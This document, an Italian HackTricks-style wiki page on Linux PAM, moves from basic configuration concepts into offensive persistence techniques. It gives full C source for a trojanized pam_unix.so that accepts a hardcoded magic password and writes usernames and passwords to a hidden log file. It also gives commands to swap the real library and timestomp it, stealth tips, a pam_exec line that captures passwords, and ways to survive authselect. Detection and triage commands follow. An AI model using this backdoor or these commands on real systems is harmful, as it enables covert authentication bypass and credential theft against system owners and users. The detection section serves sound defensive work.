# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informazioni di base

**PAM (Pluggable Authentication Modules)** agisce come un meccanismo di sicurezza che **verifica l'identità degli utenti che tentano di accedere ai servizi del computer**, controllandone l'accesso in base a vari criteri. È simile a un custode digitale, che garantisce che solo gli utenti autorizzati possano utilizzare servizi specifici, limitandone potenzialmente l'utilizzo per evitare il sovraccarico del sistema.

#### File di configurazione

- I sistemi **Solaris e basati su UNIX** utilizzano in genere un file di configurazione centrale situato in `/etc/pam.conf`.
- I sistemi **Linux** preferiscono un approccio basato su directory, memorizzando le configurazioni specifiche dei servizi in `/etc/pam.d`. Ad esempio, il file di configurazione per il servizio di login si trova in `/etc/pam.d/login`.

Un esempio di configurazione PAM per il servizio di login potrebbe essere il seguente:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Ambiti di gestione PAM**

Questi ambiti, o gruppi di gestione, includono **auth**, **account**, **password** e **session**, ciascuno responsabile di aspetti diversi del processo di autenticazione e gestione della sessione:

- **Auth**: convalida l'identità dell'utente, spesso richiedendo una password.
- **Account**: gestisce la verifica dell'account, controllando condizioni come l'appartenenza a un gruppo o le restrizioni basate sull'orario.
- **Password**: gestisce gli aggiornamenti delle password, inclusi i controlli di complessità e la prevenzione degli attacchi a dizionario.
- **Session**: gestisce le azioni durante l'avvio o la chiusura di una sessione di servizio, come il montaggio delle directory o l'impostazione dei limiti delle risorse.

#### **Controlli dei moduli PAM**

I controlli determinano la risposta del modulo in caso di successo o errore, influenzando il processo di autenticazione complessivo. Includono:

- **Required**: il fallimento di un modulo required provoca infine il fallimento, ma solo dopo che tutti i moduli successivi sono stati verificati.
- **Requisite**: terminazione immediata del processo in caso di fallimento.
- **Sufficient**: il successo salta i controlli rimanenti dello stesso ambito, a meno che un modulo successivo non fallisca.
- **Optional**: provoca un fallimento solo se è l'unico modulo nello stack.

#### Semantica offensiva rilevante

Quando si esegue il backdooring di PAM, la **posizione della regola inserita** è spesso più importante del payload stesso:

- `include` e `substack` importano regole da altri file, quindi modificare `sshd` potrebbe avere effetto solo su SSH, mentre modificare `system-auth`, `common-auth` o un altro stack condiviso può influenzare diversi servizi contemporaneamente.
- PAM supporta anche controlli tra parentesi quadre come `[success=1 default=ignore]`. Questi possono essere abusati per **saltare uno o più moduli** dopo un controllo personalizzato riuscito, invece di sostituire visibilmente `pam_unix.so`.
- Il `module-path` può essere **assoluto** (`/usr/lib/security/pam_custom.so`) oppure **relativo** alla directory predefinita dei moduli PAM. Sui sistemi Linux moderni, le directory effettive sono spesso `/lib/security`, `/lib64/security`, `/usr/lib/security` o percorsi multiarch come `/usr/lib/x86_64-linux-gnu/security`.

Indicazione rapida per l'operatore: mappare sempre il **service graph completo** prima di applicare patch. Ad esempio, `sshd -> password-auth -> system-auth` su alcune distro oppure `sshd -> system-remote-login -> system-login -> system-auth` su altre significa che lo stesso implant di una sola riga può propagarsi molto più ampiamente di quanto previsto.

#### Scenario di esempio

In una configurazione con più moduli auth, il processo segue un ordine rigoroso. Se il modulo `pam_securetty` rileva che il terminale di login non è autorizzato, i login dell'utente root vengono bloccati, ma tutti i moduli vengono comunque elaborati a causa del suo stato "required". `pam_env` imposta le variabili d'ambiente, migliorando potenzialmente l'esperienza dell'utente. I moduli `pam_ldap` e `pam_unix` collaborano per autenticare l'utente, con `pam_unix` che tenta di utilizzare una password fornita in precedenza, aumentando l'efficienza e la flessibilità dei metodi di autenticazione.


## Backdooring PAM – Hooking `pam_unix.so`

Un classico trucco di persistence negli ambienti Linux di elevato valore consiste nel **sostituire la libreria PAM legittima con un drop-in trojanizzato**. Poiché ogni login SSH / da console finisce per chiamare `pam_unix.so:pam_sm_authenticate()`, bastano poche righe di C per catturare le credenziali o implementare un bypass tramite password *magic*.

### Cheatsheet di compilazione
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compila e sostituisci furtivamente:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Consigli OpSec
1. **Sovrascrittura atomica** – scrivi in un file temporaneo e usa `mv` per sostituirlo, così da evitare librerie scritte a metà che bloccherebbero l'accesso SSH.
2. Posizionare il file di log, ad esempio in `/usr/bin/.dbus.log`, lo fa sembrare un artefatto legittimo del desktop.
3. Mantieni identiche le esportazioni dei simboli (`pam_sm_setcred`, ecc.) per evitare malfunzionamenti di PAM.

### Rilevamento
* Confronta l'MD5/SHA256 di `pam_unix.so` con quello del pacchetto della distro.
* `rpm -V pam` o `debsums -s libpam-modules` consentono di individuare librerie sostituite senza eseguire manualmente l'hashing.
* Verifica la presenza di permessi di scrittura per tutti o di ownership insolita in `/lib/security/`.
* Regola `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Cerca nei file di configurazione PAM moduli inattesi: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Comandi per il triage rapido (dopo una compromissione o durante il threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abusare di `pam_exec` per la persistenza
Invece di sostituire `pam_unix.so`, un approccio meno invasivo consiste nell'aggiungere una riga `pam_exec` in `/etc/pam.d/sshd`, in modo che ogni accesso SSH avvii un implant lasciando intatto lo stack normale:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` riceve i metadati PAM nelle variabili d'ambiente come `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` e `PAM_TYPE`. Con `expose_authtok`, l'helper può anche leggere la password da `stdin` durante le fasi `auth` o `password`. Se vuoi eseguire l'helper con l'UID effettivo invece dell'UID reale, aggiungi `seteuid`.

Note pratiche:

- `session optional pam_exec.so ...` è preferibile per le **azioni post-login**, come riaprire socket o avviare un daemon detached.
- `auth optional pam_exec.so quiet expose_authtok ...` è la scelta usuale per il **credential capture**, perché viene eseguito prima dell'apertura della sessione.
- `type=session` o `type=auth` possono essere utilizzati per limitare l'esecuzione a una fase PAM specifica ed evitare una doppia esecuzione rumorosa.

### Sopravvivere al distro tooling: `authselect`

Su RHEL, CentOS Stream, Fedora e sistemi derivati, le modifiche dirette ai file generati come `/etc/pam.d/system-auth` o `/etc/pam.d/password-auth` possono essere **sovrascritte da `authselect`**. Per garantire la persistenza, gli operatori applicano spesso patch al profilo custom attivo in `/etc/authselect/custom/<profile>/` e poi lo riselezionano o lo applicano.

Workflow tipico quando disponi di root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Questo è importante sia per l'offense sia per il triage: se `/etc/pam.d/system-auth` contiene il banner `Generated by authselect` e `Do not modify this file manually`, il vero punto di persistenza potrebbe trovarsi in `/etc/authselect/custom/` anziché in `/etc/pam.d/`.

### Recent tradecraft osservato in the wild

Le segnalazioni recenti del 2025 sulla backdoor Linux **Plague** hanno mostrato la stessa idea di base portata oltre: un componente PAM malevolo con una **static bypass password**, oltre alla pulizia delle variabili d'ambiente relative a SSH e della shell history (`HISTFILE=/dev/null`) per ridurre le tracce della sessione dopo il login. Questo rappresenta un utile pattern di hunting, perché la logica della backdoor potrebbe risiedere in PAM, mentre gli artefatti stealth potrebbero comparire solo **dopo** il completamento dell'autenticazione.


## Riferimenti

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
